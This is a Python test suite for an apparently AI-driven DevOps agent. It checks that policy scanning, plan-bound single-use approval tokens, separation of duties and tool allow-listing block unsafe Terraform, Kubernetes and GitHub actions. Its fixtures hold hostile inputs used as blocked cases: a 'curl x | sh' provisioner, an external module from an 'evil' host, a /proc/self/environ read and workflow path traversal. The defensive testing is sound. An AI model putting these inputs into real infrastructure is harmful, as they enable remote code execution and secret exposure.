import base64
import json
import os
import shutil
import sqlite3
import tempfile
import unittest

import httpx
from fastapi.testclient import TestClient

from devops_agent import agents, approval, db, mcp, obs, policy, rag
from devops_agent.main import app

c = TestClient(app)
ALICE, BOB, CAROL, DAN = ({"X-API-Key": k} for k in ("ka", "kb", "kc", "kd"))
BUCKET = 'resource "aws_s3_bucket" "b" {\n  bucket = "x"\n}\n'


def tok(rid, content, blob=b"", approver="bob", ttl=600):
    return approval.mint(rid, policy.plan_hash(content, blob), approver, ttl)


def make(headers, **body):
    return c.post("/requests", json={"title": "Logs bucket", "cloud": "aws", **body}, headers=headers).json()["id"]


class Policy(unittest.TestCase):
    def rules(self, text, kind="terraform"):
        return {f["rule"] for f in policy.scan(text, kind)}

    def test_regex_rules(self):
        self.assertEqual(agents.scan('cidr = "0.0.0.0/0"')[0]["rule"], "open-ingress")
        self.assertEqual(agents.scan('resource "aws_s3_bucket" "x" {}'), [])
        for bad, rule in [
            ('block_public_acls = false', "s3-public-access-off"), ('"Principal": "*"', "public-principal"),
            ('"Action": ["*"]', "iam-wildcard"), ('publicly_accessible = true', "public-database"),
            ('x = file("/proc/self/environ")', "local-file-read"), ('password = "hunter22"', "hardcoded-secret"),
        ]:
            self.assertIn(rule, self.rules(bad), bad)

    def test_allowlist_blocks_the_unexpected(self):
        evil = {
            "provisioner": 'resource "aws_s3_bucket" "b" {\n  provisioner "local-exec" {\n    command = "curl x | sh"\n  }\n}\n',
            "provider block": 'provider "aws" {\n  region = "us-east-1"\n}\n',
            "module": 'module "m" {\n  source = "git::https://evil/x"\n}\n',
            "terraform/backend block": 'terraform {\n  backend "http" {}\n}\n',
            "external data": 'data "external" "e" {\n  program = ["sh"]\n}\n',
            "unlisted resource": 'resource "aws_iam_user" "u" {\n  name = "x"\n}\n',
            "top-level attribute": 'foo = "bar"\n',
            "unbalanced": 'resource "aws_s3_bucket" "b" {\n  bucket = "x"\n',
        }
        for name, text in evil.items():
            self.assertTrue(any(f["severity"] == "high" for f in policy.scan(text)), name)
        self.assertEqual(policy.scan(BUCKET), [])

    def test_scanner_is_not_fooled_by_strings_heredocs_comments(self):
        ok = (
            '# a comment with { and "\nvariable "n" {\n  default = "has } brace and \\" quote"\n}\n'
            'resource "aws_s3_bucket" "b" {\n  bucket = "${var.n}-${lookup({a = "b"}, "a")}"\n'
            '  tags = { note = <<EOT\n} " {\nEOT\n  }\n}\n/* block { comment */\n'
        )
        self.assertEqual(policy.scan(ok), [])
        # a dangerous block hidden after a tricky string is still found
        sneaky = 'variable "v" {\n  default = "}"\n}\nprovider "aws" {}\n'
        self.assertIn("disallowed-block", self.rules(sneaky))

    def test_env_can_extend_allowlist(self):
        os.environ["TF_ALLOWED_RESOURCES"] = "aws_iam_role"
        try:
            self.assertEqual(policy.scan('resource "aws_iam_role" "r" {\n  name = "x"\n}\n'), [])
        finally:
            os.environ.pop("TF_ALLOWED_RESOURCES")

    def test_plan_hash_binds_artifact_and_blob(self):
        h = policy.plan_hash("a", b"p")
        self.assertNotEqual(h, policy.plan_hash("a2", b"p"))
        self.assertNotEqual(h, policy.plan_hash("a", b"p2"))
        self.assertNotEqual(policy.plan_hash("ab", b""), policy.plan_hash("a", b"b"))  # separator prevents ambiguity

    def test_rag(self):
        self.assertTrue(any("public" in p for p in rag.search("s3 bucket public access")))


class Approval(unittest.TestCase):
    def test_token_checks(self):
        t = approval.mint(7, "h", "bob")
        self.assertEqual(approval.verify(t, 7, "h")["sub"], "bob")
        other = approval.mint(8, "h", "bob")
        for args in [(t, 8, "h"), (t, 7, "x"), ("junk", 7, "h"), (None, 7, "h"), (t[:-3] + "AAA", 7, "h"),
                     (other.split(".")[0] + "." + t.split(".")[1], 7, "h"), (approval.mint(7, "h", "bob", ttl=-1), 7, "h")]:
            with self.assertRaises(approval.TokenInvalid):
                approval.verify(*args)

    def test_fails_closed_without_secret(self):
        old = os.environ["APPROVAL_SECRET"]
        os.environ["APPROVAL_SECRET"] = "short"
        try:
            with self.assertRaises(approval.TokenInvalid):
                approval.mint(1, "h", "bob")
        finally:
            os.environ["APPROVAL_SECRET"] = old

    def test_gateway_requires_bound_single_use_token(self):
        a = {"cloud": "aws", "content": BUCKET, "request_id": 5}
        with self.assertRaisesRegex(mcp.ApprovalRejected, "required"):
            mcp.call("terraform.apply", a)
        t = tok(5, BUCKET)
        self.assertTrue(mcp.call("terraform.apply", a, token=t)["dry_run"])
        with self.assertRaisesRegex(mcp.ApprovalRejected, "already used"):  # replay
            mcp.call("terraform.apply", a, token=t)
        t2 = tok(5, BUCKET)
        with self.assertRaisesRegex(mcp.ApprovalRejected, "plan changed"):  # content swapped after approval
            mcp.call("terraform.apply", {**a, "content": BUCKET + "# x\n"}, token=t2)
        with self.assertRaisesRegex(mcp.ApprovalRejected, "different request"):
            mcp.call("terraform.apply", {**a, "request_id": 6}, token=t2)
        self.assertTrue(mcp.call("terraform.apply", a, token=t2)["dry_run"])  # a failed check does not burn the token
        with self.assertRaisesRegex(mcp.ApprovalRejected, "plan changed"):  # plan blob swapped
            mcp.call("terraform.apply", {**a, "plan_blob": base64.b64encode(b"other").decode()}, token=tok(5, BUCKET))

    def test_gateway_default_deny_and_policy(self):
        with self.assertRaisesRegex(mcp.PolicyDenied, "not allow-listed"):
            mcp.call("rm.rf", {"cloud": "aws"}, token="x")
        bad = BUCKET.replace('bucket = "x"', 'bucket = "x"\n  provisioner "local-exec" {}')
        with self.assertRaisesRegex(mcp.PolicyDenied, "blocked by policy"):  # even with a perfectly valid token
            mcp.call("terraform.apply", {"cloud": "aws", "content": bad, "request_id": 9}, token=tok(9, bad))
        with self.assertRaisesRegex(mcp.PolicyDenied, "blocked by policy"):  # reading plans runs providers too
            mcp.call("terraform.plan", {"cloud": "aws", "content": 'data "external" "e" {}\n', "request_id": 9})

    def test_blast_radius_summary(self):
        js = json.dumps({"resource_changes": [
            {"address": "a", "change": {"actions": ["delete"]}}, {"address": "b", "change": {"actions": ["create"]}},
            {"address": "c", "change": {"actions": ["no-op"]}}, {"address": "d", "change": {"actions": ["delete", "create"]}}]})
        s = mcp.plan_summary(js)
        self.assertEqual((s["adds"], s["deletes"], len(s["changes"])), (2, 2, 3))


class Api(unittest.TestCase):
    def test_full_flow_with_separation_of_duties(self):
        rid = make(CAROL)
        r = c.get(f"/requests/{rid}", headers=CAROL).json()
        self.assertEqual((r["status"], r["requester"]), ("pending_approval", "carol"))
        self.assertIn("aws_s3_bucket", r["outputs"]["terraform"])
        self.assertEqual(r["outputs"]["plan_hash"], db.get_plan(rid)["plan_hash"])
        self.assertEqual(c.post(f"/requests/{rid}/approve", headers=CAROL).status_code, 403)  # own request
        self.assertEqual(c.post(f"/requests/{rid}/approve", headers=ALICE).status_code, 403)  # no approver role
        self.assertEqual(c.get(f"/requests/{rid}", headers=CAROL).json()["status"], "pending_approval")
        self.assertTrue(c.post(f"/requests/{rid}/approve", headers=BOB).json()["dry_run"])
        self.assertEqual(c.get(f"/requests/{rid}", headers=BOB).json()["status"], "applied")
        self.assertEqual(c.post(f"/requests/{rid}/approve", headers=BOB).status_code, 409)
        log = c.get("/audit", headers=BOB).json()
        self.assertTrue(any(a["event"] == "request.approve_denied" and a["actor"] == "carol" and a["request_id"] == rid for a in log))
        call = next(a for a in log if a["event"] == "mcp.call" and a["request_id"] == rid and "terraform.apply" in a["detail"])
        self.assertIn("approver=bob", call["detail"])
        self.assertEqual(call["plan_hash"], r["outputs"]["plan_hash"])
        with db._conn() as con:
            row = db._x(con, "SELECT approver, request_id FROM approval_tokens WHERE request_id=?", (rid,)).fetchone()
        self.assertEqual(row["approver"], "bob")

    def test_roles_and_isolation(self):
        rid = make(ALICE)
        self.assertEqual(c.post("/requests", json={"title": "x"}, headers=BOB).status_code, 403)  # approvers can't request
        self.assertEqual(c.get(f"/requests/{rid}", headers=DAN).status_code, 404)
        self.assertEqual(c.post(f"/requests/{rid}/reject", headers=DAN).status_code, 404)
        self.assertNotIn(rid, [r["id"] for r in c.get("/requests", headers=DAN).json()])
        self.assertIn(rid, [r["id"] for r in c.get("/requests", headers=BOB).json()])
        self.assertEqual(c.get("/audit", headers=ALICE).status_code, 403)
        self.assertEqual(c.post(f"/requests/{rid}/reject", headers=ALICE).status_code, 200)  # owner may cancel
        self.assertEqual(c.post(f"/requests/{rid}/approve", headers=BOB).status_code, 409)

    def test_plan_changed_after_review_goes_back_to_approval(self):
        rid = make(ALICE)
        out = db.get(rid)["outputs"]
        db.update(rid, outputs={**out, "terraform": out["terraform"] + "\n# swapped after review\n"})
        r = c.post(f"/requests/{rid}/approve", headers=BOB)
        self.assertEqual(r.status_code, 409)
        self.assertIn("plan changed", r.json()["detail"])
        self.assertEqual(db.get(rid)["status"], "pending_approval")  # re-approval needed; nothing ran

    def test_policy_violation_blocks_before_approval(self):
        rid = make(ALICE)
        db.update(rid, status="running")
        out = db.get(rid)["outputs"]
        out["terraform"] = 'resource "aws_iam_user" "u" {\n  name = "x"\n}\n'
        db.update(rid, outputs=out)
        findings = policy.scan(out["terraform"])
        self.assertTrue(findings)
        self.assertEqual(c.post(f"/requests/{rid}/approve", headers=BOB).status_code, 409)  # not pending_approval

    def test_kubernetes_flow_and_policy(self):
        rid = make(ALICE, title="Web app", kind="kubernetes")
        r = c.get(f"/requests/{rid}", headers=ALICE).json()
        self.assertEqual(r["status"], "pending_approval")
        self.assertIn("kind: Deployment", r["outputs"]["kubernetes"])
        self.assertEqual(r["outputs"]["plan_summary"]["kinds"], ["Deployment"])
        self.assertTrue(c.post(f"/requests/{rid}/approve", headers=BOB).json()["dry_run"])
        ok = {"cloud": "aws", "namespace": "apps", "content": "kind: Deployment\n", "request_id": 1}
        for bad, why in (({"namespace": "kube-system"}, "namespace not allowed"), ({"content": "privileged: true"}, "blocked by policy"),
                         ({"content": "kind: ClusterRoleBinding"}, "cluster-scoped"),
                         ({"content": "metadata:\n  namespace: kube-system"}, "manifest namespace")):
            args = {**ok, **bad}
            with self.assertRaisesRegex(mcp.PolicyDenied, why):
                mcp.call("kubectl.apply", args, token=tok(1, args["content"]))

    def test_github_pr_flow_and_policy(self):
        os.environ.update(GITHUB_REPO="o/gitops", GITHUB_TOKEN="t", EXECUTE="1", ROLE="executor")
        calls = []

        def handler(req):
            calls.append(req.method)
            body = {"/repos/o/gitops": {"default_branch": "main"}, "/repos/o/gitops/git/ref/heads/main": {"object": {"sha": "abc"}},
                    "/repos/o/gitops/pulls": {"html_url": "https://github.com/o/gitops/pull/1"}}
            return httpx.Response(200, json=body.get(req.url.path, {}))

        real = mcp._http
        mcp._http = lambda: httpx.Client(base_url="https://api.github.com", transport=httpx.MockTransport(handler))
        try:
            good = {"cloud": "aws", "repo": "o/gitops", "path": "requests/1-x/main.tf", "branch": "agent/request-1",
                    "title": "t", "body": "b", "content": BUCKET, "request_id": 1}
            self.assertEqual(mcp.call("github.create_pr", good, token=tok(1, BUCKET))["pr_url"], "https://github.com/o/gitops/pull/1")
            self.assertEqual(calls, ["GET", "GET", "POST", "PUT", "POST"])
            for bad in ({"repo": "evil/repo"}, {"path": "requests/../.github/workflows/x.yml"},
                        {"path": ".github/workflows/x.yml"}, {"branch": "main"}):
                with self.assertRaises(mcp.PolicyDenied):
                    mcp.call("github.create_pr", {**good, **bad}, token=tok(1, BUCKET))
            with self.assertRaises(mcp.ApprovalRejected):
                mcp.call("github.create_pr", good)
        finally:
            mcp._http = real
            for k in ("GITHUB_REPO", "GITHUB_TOKEN", "EXECUTE", "ROLE"):
                os.environ.pop(k, None)

    def test_github_kind_end_to_end(self):
        os.environ["GITHUB_REPO"] = "o/gitops"
        try:
            rid = make(ALICE, kind="github")
            self.assertEqual(c.get(f"/requests/{rid}", headers=ALICE).json()["status"], "pending_approval")
            self.assertTrue(c.post(f"/requests/{rid}/approve", headers=BOB).json()["dry_run"])
            self.assertEqual(c.get(f"/requests/{rid}", headers=ALICE).json()["status"], "pr_opened")
        finally:
            os.environ.pop("GITHUB_REPO")

    def test_in_process_mode_never_executes_for_real(self):
        os.environ["EXECUTE"] = "1"  # no ROLE=executor, so still a dry run
        try:
            rid = make(ALICE)
            self.assertTrue(c.post(f"/requests/{rid}/approve", headers=BOB).json()["dry_run"])
        finally:
            os.environ.pop("EXECUTE")

    def test_metrics(self):
        c.get("/requests", headers=ALICE)
        m = c.get("/metrics").text
        for s in ('http_requests_total{method="GET",route="/requests",status="200"}', "llm_calls_total", "mcp_calls_total", "approvals_denied_total"):
            self.assertIn(s, m)
        self.assertIsNotNone(obs.render())

    def test_auth_and_validation(self):
        self.assertEqual(c.get("/requests").status_code, 401)
        self.assertEqual(c.get("/requests", headers={"X-API-Key": "wrong"}).status_code, 401)
        self.assertEqual(c.post("/requests", json={"title": "x", "cloud": "gcp"}, headers=ALICE).status_code, 422)
        self.assertEqual(c.post("/requests", json={"title": "x", "kind": "shell"}, headers=ALICE).status_code, 422)
        users = os.environ.pop("API_USERS")
        try:
            self.assertEqual(c.get("/requests", headers=ALICE).status_code, 503)  # fails closed, never open
        finally:
            os.environ["API_USERS"] = users

    @unittest.skipIf(os.getenv("DATABASE_URL"), "sqlite-specific; Postgres in-place migration is covered by running the suite on an old DB")
    def test_migrates_old_database_in_place(self):
        path = os.path.join(tempfile.mkdtemp(), "old.db")
        con = sqlite3.connect(path)
        con.executescript(
            "CREATE TABLE requests(id INTEGER PRIMARY KEY, title TEXT, description TEXT, cloud TEXT, kind TEXT DEFAULT 'terraform',"
            " status TEXT, outputs TEXT DEFAULT '{}', created REAL);"
            "CREATE TABLE audit(id INTEGER PRIMARY KEY, ts REAL, actor TEXT, event TEXT, detail TEXT);"
            "INSERT INTO requests(title,cloud,status) VALUES('old','aws','applied');")
        con.commit()
        con.close()
        keep = os.environ["DB_PATH"]
        os.environ["DB_PATH"] = path
        try:
            self.assertEqual((db.get(1)["title"], db.get(1)["requester"]), ("old", ""))
            db.set_plan(1, "h", "b", "{}")
            self.assertEqual(db.get_plan(1)["plan_hash"], "h")
        finally:
            os.environ["DB_PATH"] = keep


@unittest.skipUnless(shutil.which("terraform"), "terraform not installed")
class RealTerraform(unittest.TestCase):
    """Real terraform binary, local backend, builtin provider (no network, no cloud): proves plan-file apply end to end."""

    ENV = {"EXECUTE": "1", "ROLE": "executor", "TF_BACKEND": "local", "TF_ALLOWED_RESOURCES": "terraform_data"}

    def setUp(self):
        os.environ.update(self.ENV, TF_LOCAL_STATE_DIR=tempfile.mkdtemp())

    def tearDown(self):
        for k in (*self.ENV, "TF_LOCAL_STATE_DIR"):
            os.environ.pop(k, None)

    def test_apply_exactly_the_approved_plan_file(self):
        content = 'resource "terraform_data" "x" {\n  input = "hello"\n}\n'
        a = {"cloud": "aws", "content": content, "request_id": 101}
        p = mcp.call("terraform.plan", a)
        self.assertEqual((p["summary"]["adds"], p["summary"]["deletes"]), (1, 0))
        blob = base64.b64decode(p["plan_blob"])
        bad = bytearray(blob)
        bad[-1] ^= 1
        with self.assertRaises(mcp.ApprovalRejected):  # tampered plan file: refused before terraform runs
            mcp.call("terraform.apply", {**a, "plan_blob": base64.b64encode(bytes(bad)).decode()}, token=tok(101, content, blob))
        r = mcp.call("terraform.apply", {**a, "plan_blob": p["plan_blob"]}, token=tok(101, content, blob))
        self.assertEqual(r["rc"], 0, r)
        self.assertIn("1 added", r["out"])
        self.assertEqual(mcp.call("terraform.plan", a)["summary"]["adds"], 0)  # remote state persisted: idempotent

    def test_stale_plan_is_refused_by_terraform(self):
        content = 'resource "terraform_data" "y" {\n  input = "v1"\n}\n'
        a = {"cloud": "aws", "content": content, "request_id": 102}
        p1 = mcp.call("terraform.plan", a)
        mcp.call("terraform.apply", {**a, "plan_blob": p1["plan_blob"]}, token=tok(102, content, base64.b64decode(p1["plan_blob"])))
        # applying the same (now stale) plan again must not re-run it
        r = mcp.call("terraform.apply", {**a, "plan_blob": p1["plan_blob"]}, token=tok(102, content, base64.b64decode(p1["plan_blob"])))
        self.assertTrue(r.get("error") or r.get("rc"), r)

    def test_policy_still_applies_on_the_executor(self):
        evil = 'resource "terraform_data" "z" {\n  provisioner "local-exec" {\n    command = "id"\n  }\n}\n'
        with self.assertRaisesRegex(mcp.PolicyDenied, "blocked by policy"):
            mcp.call("terraform.plan", {"cloud": "aws", "content": evil, "request_id": 103})


if __name__ == "__main__":
    unittest.main()
